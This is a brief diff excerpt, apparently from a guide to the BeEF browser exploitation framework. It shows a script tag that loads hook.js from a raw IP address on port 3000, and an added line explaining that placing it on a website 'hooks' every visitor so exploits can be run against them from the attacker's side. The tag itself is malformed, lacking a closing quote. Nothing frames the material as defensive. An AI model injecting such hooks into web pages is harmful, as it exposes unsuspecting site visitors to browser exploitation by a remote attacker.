@@ -82,6 +82,8 @@ Scroll down to the bottom add your beef hook link everyones is different as an e
 
 <script src="http://209.38.16.144:3000/hook.js></script>
 
+Once the script is added this allows us to "HOOK" anyone who visits the website opening them to exploits to be executed on our end.
+
 
 
 
